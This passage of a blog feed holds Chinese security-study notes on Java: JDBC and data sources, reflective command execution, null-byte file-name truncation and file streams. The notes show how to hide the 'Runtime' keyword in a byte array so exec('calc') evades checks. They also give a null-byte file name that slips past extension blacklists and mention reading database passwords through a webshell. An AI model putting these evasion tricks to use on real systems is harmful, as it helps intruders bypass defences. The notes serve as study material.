href="https://zhishihezi.net/endpoint/richtext/513dfa85670cfe82b2cb0e0a8dea90a6?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d0057ad43cf2e97752fad0abee3e598bf4f94d76ce28e69a8146f48c8b37aa7ba51d148a839377b8b90b048c05cdd6fe9eb12e85a55d5fc174a7a2fd1c12a0abb871c23c660e98fd8e5db055d4bc9958fdd7dd47cc0445ebc45363cde3acf346fdb89ead4d58a648c2ead5a0fd884caeeaa30eea2e34a9986b03f7468edef74549e6162894fe866453287a887800f0371d50e391c5f0045451669ed87b54fb6e390729a7627a22ed567852464585f64c0091cba2c6e699f22b14f29f272273e5e27#0">https://zhishihezi.net/endpoint/richtext/513dfa85670cfe82b2cb0e0a8dea90a6?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d0057ad43cf2e97752fad0abee3e598bf4f94d76ce28e69a8146f48c8b37aa7ba51d148a839377b8b90b048c05cdd6fe9eb12e85a55d5fc174a7a2fd1c12a0abb871c23c660e98fd8e5db055d4bc9958fdd7dd47cc0445ebc45363cde3acf346fdb89ead4d58a648c2ead5a0fd884caeeaa30eea2e34a9986b03f7468edef74549e6162894fe866453287a887800f0371d50e391c5f0045451669ed87b54fb6e390729a7627a22ed567852464585f64c0091cba2c6e699f22b14f29f272273e5e27#0</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java代理&quot;&gt;&lt;a href=&quot;#Java代理&quot; class=&quot;headerlink&quot; title=&quot;Java代理&quot;&gt;&lt;/a&gt;Java代理&lt;/h1&gt;&lt;p&gt;当一个对象不能直接使用，可以创建一个客户端和目标对象直接创建一个中介，这个中介就是代理&lt;/p&gt;
&lt;p&gt;代理模</summary>
      
    
    
    
    <category term="编程语言" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>JDBC基础</title>
    <link href="http://example.com/2021/10/15/JDBC%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2021/10/15/JDBC%E5%9F%BA%E7%A1%80/</id>
    <published>2021-10-15T14:54:04.000Z</published>
    <updated>2021-10-15T14:56:18.881Z</updated>
    
    <content type="html"><![CDATA[<h1 id="JDBC-基础"><a href="#JDBC-基础" class="headerlink" title="JDBC 基础"></a>JDBC 基础</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>JDBC 是java 提供对数据库就行连接，操作得标准 API，Java 自身并不会去实现对数据库得连接查询更新等操作而是通过抽象出数据库操作的 API 接口（JDBC）。</p><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>Java通过<code>java.sql.DriverManager</code>来管理所有数据库的驱动注册，所以如果想要建立数据库连接需要先在<code>java.sql.DriverManager</code>中注册对应的驱动类，然后调用<code>getConnection</code>方法才能连接上数据库。</p><p>JDBC定义了一个叫<code>java.sql.Driver</code>的接口类负责实现对数据库的连接，所有的数据库驱动包都必须实现这个接口才能够完成数据库的连接操作。<code>java.sql.DriverManager.getConnection(xx)</code>其实就是间接的调用了<code>java.sql.Driver</code>类的<code>connect</code>方法实现数据库连接的。数据库连接成功后会返回一个叫做<code>java.sql.Connection</code>的数据库连接对象，一切对数据库的查询操作都将依赖于这个<code>Connection</code>对象。</p><p>JDBC连接数据库的一般步骤:</p><ol><li>注册驱动 <code>Class.forName(&quot;数据库驱动的类名&quot;)</code></li><li>获取连接 <code>DriverManager.getConnection()</code></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">String CLASS_NAME = <span class="hljs-string">&quot;com.mysql.jdbc.Driver&quot;</span>;<br>String URL = <span class="hljs-string">&quot;jdbc:mysql://localhost:3306/mysql&quot;</span><br>String USERNAME = <span class="hljs-string">&quot;root&quot;</span>;<br>String PASSWORD = <span class="hljs-string">&quot;root&quot;</span>;<br><br>Class.forName(CLASS_NAME);<span class="hljs-comment">// 注册JDBC驱动类</span><br>Connection connection = DriverManager.getConnection(URL, USERNAME, PASSWORD);<br></code></pre></td></tr></table></figure><p><strong>数据库配置信息</strong></p><p>传统的 Web 应用数据库配置信息一般都是存在 <code>WEB-INF</code> 目录下的 <code>*.properties</code> <code>*.yml</code> <code>*.xml</code>中的，如果是 <code>Spring Boot</code> 项目的话一般都存储在 <code>src/main/resources/</code> 目录下。常见的数据库配置信息的路径：<code>WEB-INF/applicationContext.xml</code> <code>WEB-INF/hibernate.cfg.xml</code> <code>WEB-INF/jdbc/jdbc.properties</code> </p><p><strong>为什么开始的时候需要 <code>Class.forName()</code> ?</strong></p><p>这一步利用了 java 反射 + 类加载机制往 <code>DriverManager</code> 中注册了驱动包，它实际上会触发类加载，<code>com.mysql.jdbc.Driver</code> 类将会被初始化，<code>static静态语句块</code> 中的代码会被执行。但是有些时候没有 <code>Class.forName()</code> 程序也可以正常运行，这是因为 Java SPI机制。因为<code>DriverManager</code>在初始化的时候会调用<code>java.util.ServiceLoader</code>类提供的SPI机制，Java会自动扫描jar包中的<code>META-INF/services</code>目录下的文件，并且还会自动的<code>Class.forName(文件中定义的类)</code>，这也就解释了为什么不需要<code>Class.forName</code>也能够成功连接数据库的原因了。</p><p><strong>Java SPI</strong></p><p>SPI(Service Provider Interface)，是JDK内置的一种服务提供发现机制。它就是一种动态替换发现机制。例如：有个接口想在运行时才发现具体的实现类，那么你只需要在程序运行前添加一个实现即可，并把新加的实现描述给JDK即可。此外，在程序的运行过程中，也可以随时对该描述进行修改，完成具体实现的替换。</p><p>Java提供了很多服务提供者接口（Service Provider Interface，SPI），允许第三方为这些接口提供实现。常见的SPI有JDBC、JCE、JNDI、JAXP和JBI等。</p><h2 id="数据库连接思考"><a href="#数据库连接思考" class="headerlink" title="数据库连接思考"></a>数据库连接思考</h2><ol><li>SPI机制是否有安全性问题？</li><li>Java反射有那些安全问题？</li><li>Java类加载机制是什么？</li><li>数据库连接时密码安全问题？</li><li>使用JDBC如何写一个通用的数据库密码爆破模块？</li></ol><h2 id="DataSource"><a href="#DataSource" class="headerlink" title="DataSource"></a>DataSource</h2><p>在真实的 Java 项目中通常不会使用原生的 <code>JDBC</code> 的 <code>DiverManager</code> 去连接数据库，而是使用数据源(<code>javax.sql.DataSource</code>) 来代替 <code>DriverManager</code> 管理数据库的连接，一般情况下 WEB 服务在启动时就会预先定义好数据源，这样就不需要编写任何数据库相关的连接代码了，直接引用 <code>DataSource</code> 对象即可获取数据库的连接。常见的数据源有：<code>DBCP</code> <code>C3P0</code> <code>Druid</code> <code>Mybatis DataSource</code> 他们都实现于 <code>javax.sql.DataSourcec</code> 接口。</p><p>在渗透测试中我们可以通过查找 Spring 数据库配置信息的找到数据库账户密码，但是很多时候我们可以找到非常多的配置项甚至是加密的配置信息。这样我们难以确定真实的数据库配置信息，所以我们可以在<code>webshell</code> 中使用注入数据源的方式来获取数据库连接对象，甚至是读取数据库密码。</p><p>参考文章</p><p><a href="https://zhishihezi.net/endpoint/richtext/6d9a22ba0a35a008c8a26de9be0af285?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d003f2aa7f127f0eebacd7781dfcc96fffc113c2aa6524a270d806d0b5cb74fcd848dc0e71a1806ba8aa6795310d7f5156f8679b530f66f98d69bcca054b7161d0311712560fdab58f84fb9f475c33e2307e1d1bf7f16cb4b78ffb1de583bcb8bdc68ff1a4b3c274eeb49ebe71ce5cc010855f8493aa598d6535c728e2b2e0c78623ece5513ef7d2037e1aa34c9180a9217120669f13f79be67e876422272b76e9a39062c8f6f4f45182f7f0d2dfab296e83843031274d8b7d87c8e39e3921eb4b9#2">https://zhishihezi.net/endpoint/richtext/6d9a22ba0a35a008c8a26de9be0af285?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d003f2aa7f127f0eebacd7781dfcc96fffc113c2aa6524a270d806d0b5cb74fcd848dc0e71a1806ba8aa6795310d7f5156f8679b530f66f98d69bcca054b7161d0311712560fdab58f84fb9f475c33e2307e1d1bf7f16cb4b78ffb1de583bcb8bdc68ff1a4b3c274eeb49ebe71ce5cc010855f8493aa598d6535c728e2b2e0c78623ece5513ef7d2037e1aa34c9180a9217120669f13f79be67e876422272b76e9a39062c8f6f4f45182f7f0d2dfab296e83843031274d8b7d87c8e39e3921eb4b9#2</a></p><p><a href="https://www.jianshu.com/p/e4262536000d">https://www.jianshu.com/p/e4262536000d</a></p><p><a href="https://blog.csdn.net/qq_27292113/article/details/100324127">https://blog.csdn.net/qq_27292113/article/details/100324127</a></p><p><a href="https://zhishihezi.net/endpoint/richtext/7cf5943a331e912a8ced8264b65ba4a4?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00fc7ce3fe3cc9fffd10a895293a0425000f798ef1f4285bc4615898486a533462dd5cc0aa1f49f370afa6cd415c847e879b80964a7cb47f9a65a3a3eec81b131c19d0650b1955cf6e77d0293a369bc09e0299b0f9c58f7226ee6c6df1f94abf9ad020bcff67e838b4fe63a4aaadcf14a330023e181ca50a45e91822ebb11299dff426c4e8dcaa968b62df740cfce6b4480a215dc739f8028c6c29d6d1079bf4dd3e70addaaf843b9fa061943758d25bb1a9ef2983de1ecbd6ca659e367482affd#1">https://zhishihezi.net/endpoint/richtext/7cf5943a331e912a8ced8264b65ba4a4?event=436b34f44b9f95fd3aa8667f1ad451b173526ab5441d9f64bd62d183bed109b0ea1aaaa23c5207a446fa6de9f588db3958e8cd5c825d7d5216199d64338d9d00fc7ce3fe3cc9fffd10a895293a0425000f798ef1f4285bc4615898486a533462dd5cc0aa1f49f370afa6cd415c847e879b80964a7cb47f9a65a3a3eec81b131c19d0650b1955cf6e77d0293a369bc09e0299b0f9c58f7226ee6c6df1f94abf9ad020bcff67e838b4fe63a4aaadcf14a330023e181ca50a45e91822ebb11299dff426c4e8dcaa968b62df740cfce6b4480a215dc739f8028c6c29d6d1079bf4dd3e70addaaf843b9fa061943758d25bb1a9ef2983de1ecbd6ca659e367482affd#1</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;JDBC-基础&quot;&gt;&lt;a href=&quot;#JDBC-基础&quot; class=&quot;headerlink&quot; title=&quot;JDBC 基础&quot;&gt;&lt;/a&gt;JDBC 基础&lt;/h1&gt;&lt;h2 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简</summary>
      
    
    
    
    <category term="编程语言" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>java命令执行</title>
    <link href="http://example.com/2021/10/15/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2021/10/15/java%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</id>
    <published>2021-10-15T14:53:54.000Z</published>
    <updated>2021-10-15T14:55:46.551Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-命令执行"><a href="#Java-命令执行" class="headerlink" title="Java 命令执行"></a>Java 命令执行</h1><h2 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//字符串转字节数组</span><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestRun</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">        String rt = new String(new byte[]&#123;106, 97, 118, 97, 46, 108, 97, 110, 103, 46, 82, 117, 110, 116, 105, 109, 101&#125;);</span><br><span class="hljs-comment">*/</span><br>        String rt = <span class="hljs-string">&quot;java.lang.UNIXProcess&quot;</span>;<br>        <span class="hljs-keyword">byte</span>[] bytes = rt.getBytes();<br>        System.out.println(Arrays.toString(bytes));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211015140423647.png" alt="image-20211015140423647"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 字节数组转字符串</span><br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestRun</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        String str = <span class="hljs-keyword">new</span> String(<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">85</span>, <span class="hljs-number">78</span>, <span class="hljs-number">73</span>, <span class="hljs-number">88</span>, <span class="hljs-number">80</span>, <span class="hljs-number">114</span>, <span class="hljs-number">111</span>, <span class="hljs-number">99</span>, <span class="hljs-number">101</span>, <span class="hljs-number">115</span>, <span class="hljs-number">115</span>&#125;);<br>        System.out.println(str);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p><img src="D:\markdown\image-20211015140627401.png" alt="image-20211015140627401"></p><h2 id="Runtime-命令执行"><a href="#Runtime-命令执行" class="headerlink" title="Runtime 命令执行"></a>Runtime 命令执行</h2><p>避免程序出现 <code>Runtime</code> 关键字，可以使用字节数组来绕过</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Method;<br><span class="hljs-keyword">import</span> java.util.Arrays;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TestRun</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException, NoSuchMethodException, IllegalAccessException, InvocationTargetException, InstantiationException </span>&#123;<br>        String runtime  = <span class="hljs-keyword">new</span> String(<span class="hljs-keyword">new</span> <span class="hljs-keyword">byte</span>[]&#123;<span class="hljs-number">106</span>, <span class="hljs-number">97</span>, <span class="hljs-number">118</span>, <span class="hljs-number">97</span>, <span class="hljs-number">46</span>, <span class="hljs-number">108</span>, <span class="hljs-number">97</span>, <span class="hljs-number">110</span>, <span class="hljs-number">103</span>, <span class="hljs-number">46</span>, <span class="hljs-number">82</span>, <span class="hljs-number">117</span>, <span class="hljs-number">110</span>, <span class="hljs-number">116</span>, <span class="hljs-number">105</span>, <span class="hljs-number">109</span>, <span class="hljs-number">101</span>&#125;);<br>        Class rt = Class.forName(runtime);<br>        Constructor cons = rt.getDeclaredConstructor();<br>        cons.setAccessible(<span class="hljs-keyword">true</span>);<br>        Object run = cons.newInstance();<br>        Method exec = rt.getMethod(<span class="hljs-string">&quot;exec&quot;</span>, String.class);<br>        exec.invoke(run,<span class="hljs-string">&quot;calc&quot;</span>);<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h2 id="ProcessBuilder命令执行"><a href="#ProcessBuilder命令执行" class="headerlink" title="ProcessBuilder命令执行"></a><img src="https://gitee.com/lcdm123/image/raw/master/image-20211015143252943.png" alt="image-20211015143252943">ProcessBuilder命令执行</h2><p>之前记录过……</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>对类熟练使用后，后面就能使用各种变形来绕过检查执行命令了</p><p>简单记录一下，万一后面有用呢🤪</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-命令执行&quot;&gt;&lt;a href=&quot;#Java-命令执行&quot; class=&quot;headerlink&quot; title=&quot;Java 命令执行&quot;&gt;&lt;/a&gt;Java 命令执行&lt;/h1&gt;&lt;h2 id=&quot;准备&quot;&gt;&lt;a href=&quot;#准备&quot; class=&quot;headerlink&quot; </summary>
      
    
    
    
    <category term="编程语言" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>java空字节漏洞</title>
    <link href="http://example.com/2021/10/15/java%E7%A9%BA%E5%AD%97%E8%8A%82%E6%BC%8F%E6%B4%9E/"/>
    <id>http://example.com/2021/10/15/java%E7%A9%BA%E5%AD%97%E8%8A%82%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-10-15T14:53:31.000Z</published>
    <updated>2021-10-23T03:20:36.518Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-空字节截断漏洞"><a href="#Java-空字节截断漏洞" class="headerlink" title="Java 空字节截断漏洞"></a>Java 空字节截断漏洞</h1><p>Java空字节漏洞影响的是 JDK 版本小于 7u40</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">创建文件时使用<br>E:\\test.txt\u0000.jpg<br>最后的文件会变成 E:\\test.txt<br></code></pre></td></tr></table></figure><p>漏洞的利用场景更多在于黑名单后缀名限制</p><blockquote><p>没有去配环境，所以就这样直接记录吧</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Java-空字节截断漏洞&quot;&gt;&lt;a href=&quot;#Java-空字节截断漏洞&quot; class=&quot;headerlink&quot; title=&quot;Java 空字节截断漏洞&quot;&gt;&lt;/a&gt;Java 空字节截断漏洞&lt;/h1&gt;&lt;p&gt;Java空字节漏洞影响的是 JDK 版本小于 7u40&lt;/p</summary>
      
    
    
    
    <category term="编程语言" scheme="http://example.com/categories/%E7%BC%96%E7%A8%8B%E8%AF%AD%E8%A8%80/"/>
    
    
    <category term="Web" scheme="http://example.com/tags/Web/"/>
    
    <category term="Java" scheme="http://example.com/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>java文件操作</title>
    <link href="http://example.com/2021/10/13/java%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/"/>
    <id>http://example.com/2021/10/13/java%E6%96%87%E4%BB%B6%E6%93%8D%E4%BD%9C/</id>
    <published>2021-10-13T11:06:37.000Z</published>
    <updated>2021-10-23T03:20:48.681Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java-文件系统"><a href="#Java-文件系统" class="headerlink" title="Java 文件系统"></a>Java 文件系统</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Java 是一个跨平台的语言，不同的操作系统具有完全不一样的文件系统和特性。JDK会根据不同的操作系统编译成不同的版本。Java 对文件的任何操作都是通过 JNI 调用 C 语言函数实现的。Java 为了能够实现跨操作系统对文件就行操作抽象了一个 <code>FileSystem</code> 的对象，不同的操作系统只需要实现抽象出来的文件操作方法就可以实现跨屏平台的文件操作。</p><h2 id="FileSystem"><a href="#FileSystem" class="headerlink" title="FileSystem"></a>FileSystem</h2><p>在 Java SE中内置了两类文件系统：<code>java.io</code> 和 <code>java.nio</code>， <code>java.nio</code>的实现是<code>sun.nio</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012205656607.png" alt="image-20211012205656607"></p><p>Java 抽象出了一个 <code>java.io.FileSystem</code> 不同的操作系统有不一样的文件系统，<code>java.io.UnixFileSystem</code> <code>java.io.WinFileSystem</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012211740019.png" alt="image-20211012211740019"></p><p><code>java.io.FileSystem</code> 是一个抽象类，它抽象了对文件的操作，不同操作系统版本的 JDK 会实现其抽象的方法从而就实现了跨平台的文件访问操作</p><p>Java 对文件的操作最终都会调用动态链接库中 C 实现的 Java Native 方法</p><p><strong>注意</strong></p><ol><li>并不是所有的文件操作都在 <code>java.io.FileSystem</code> 中定义，文件的读取最终调用的是<code>java.io.FileInputStream#read0、readBytes</code>、<code>java.io.RandomAccessFile#read0、readBytes</code>，而写文件调用的是<code>java.io.FileOutputStream#writeBytes</code>、<code>java.io.RandomAccessFile#write0</code></li><li>Java 有两类文件系统 API，基于阻塞模式的 IO 的文件系统，另一个是 JDK7 + 基于NIO.2 的文件系统</li></ol><h2 id="流"><a href="#流" class="headerlink" title="流"></a>流</h2><p>流是一个抽象的概念，是对输入输出设备的抽象，Java 程序中，对于数据的 输入/ 输出 操作都是以流的方式进行。设备包括文件，网络，内存。流具有方向性，至于是输入流还是输出流则是一个相对的概念。当程序需要从某个数据源读取数据的时候，就会开启一个输入流，数据源可以是文件、内存或网络。需要写入数据到某个数据源目的地的时候，也会开启一个输出流，这个数据源目的地可以是文件、内存或网络。</p><p>流的分类:</p><ol><li>处理的数据单位不同可分为：字符流、字节流</li><li>数据流方向不同可分为：输入流、输出流</li><li>功能不同可分为：节点流、处理流</li></ol><p>节点流：节点流从一个特定的数据源读写数据。即节点流是直接操作文件，网络等的流，例如<code>FileInputStream</code>和<code>FileOutputStream</code> 他们直接从文件中读取或网文件中写入字节流。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013141241721.png" alt="image-20211013141241721"></p><p>处理流：”连接“在已存在的流（节点流或处理流）之上通过对数据的处理为程序提供更为强大的读写功能。过滤流是使用一个已经存在的输入流或输出流连接创建的，过滤流就是对节点流进行一系列的包装。例如<code>BufferedInputStream</code>和<code>BufferedOutputStream</code>，使用已经存在的节点流来构造，提供带缓冲的读写，提高了读写的效率，以及<code>DataInputStream</code>和<code>DataOutputStream</code>，使用已经存在的节点流来构造，提供了读写Java中的基本数据类型的功能。他们都属于过滤流。</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013141458973.png" alt="image-20211013141458973"></p><p><strong>流结构</strong></p><p>Java 所有的流类位于<code>java.io</code>包中，都分别继承以下四个抽象流类型</p><table><thead><tr><th></th><th>字节流</th><th>字符流</th></tr></thead><tbody><tr><td>输入流</td><td><code>InputStream</code></td><td><code>Reader</code></td></tr><tr><td>输出流</td><td><code>OutputStream</code></td><td><code>Writer</code></td></tr></tbody></table><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013153458771.png" alt="image-20211013153458771"></p><p><strong>常见流</strong></p><ul><li>缓冲流：缓冲流要“套接”在相应的节点流之上，对读写的数据提供了缓冲的功能，提高了读写效率，同事增加了一些新的方法</li><li>转换流：用于字节数据到字符数据之间的转换</li><li>数据流：提供了读写Java中的基本数据类型的功能</li><li>对象流：用于直接将对象写入写出</li></ul><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><blockquote><p>最开始有点理解错误了，直接导入 <code>java.io.FileSystem</code> 包发现不对，后面查了一下发现 <code>java.io.FileSystem</code> 是抽象类不能直接调用而应该调用 <code>java.io.File</code> 类 ，这个类是通过它实现的</p></blockquote><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012234012387.png" alt="image-20211012234012387"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211012235627129.png" alt="image-20211012235627129"></p><h3 id="字符流方法"><a href="#字符流方法" class="headerlink" title="字符流方法"></a><strong>字符流方法</strong></h3><p>文件读取操作</p><ol><li>先获得文件句柄</li><li>获得文件句柄当作是输入一个字节码流，需要对这个输入流进行读取</li><li>读取到输入流后，需要读取生成字节流</li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 使用 BufferedReader 的 readLine() 方法</span><br><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.BufferedReader;<br><span class="hljs-keyword">import</span> java.io.File;<br><span class="hljs-keyword">import</span> java.io.FileReader;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;E:/test.txt&quot;</span>);<br>        BufferedReader read = <span class="hljs-keyword">new</span> BufferedReader(<span class="hljs-keyword">new</span> FileReader(<span class="hljs-string">&quot;E:/test.txt&quot;</span>));<br>        String str;<br>        <span class="hljs-keyword">while</span>((str = read.readLine()) != <span class="hljs-keyword">null</span>) &#123;<br>            System.out.println(str);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>FileReader </code>类是从 <code>InputStreamReader</code> 类继承而来。该类按字符读取流中数据</p><p>在给定从中读取数据的<code>File</code>的情况下创建一个 <code>FileReader</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013132110815.png" alt="image-20211013132110815"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211013133158759.png" alt="image-20211013133158759"></p><p>文件写入</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// BufferedWriter</span><br><span class="hljs-keyword">package</span> com;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">FileTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException </span>&#123;<br>        File file = <span class="hljs-keyword">new</span> File(<span class="hljs-string">&quot;E:/test.txt&quot;</span>);<br>        BufferedWriter out = <span class="hljs-keyword">new</span> BufferedWriter(<span class="hljs-keyword">new</span> FileWriter(file));<br>        String str = <span class="hljs-string">&quot;文件写入！！！&quot;</span>;<br>        out.write(str);<br>        out.close();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><code>BufferedWriter</code>属于字符流体系中的一员，与 <code>FileWriter</code> 不同的是 <code>BufferedWriter</code> 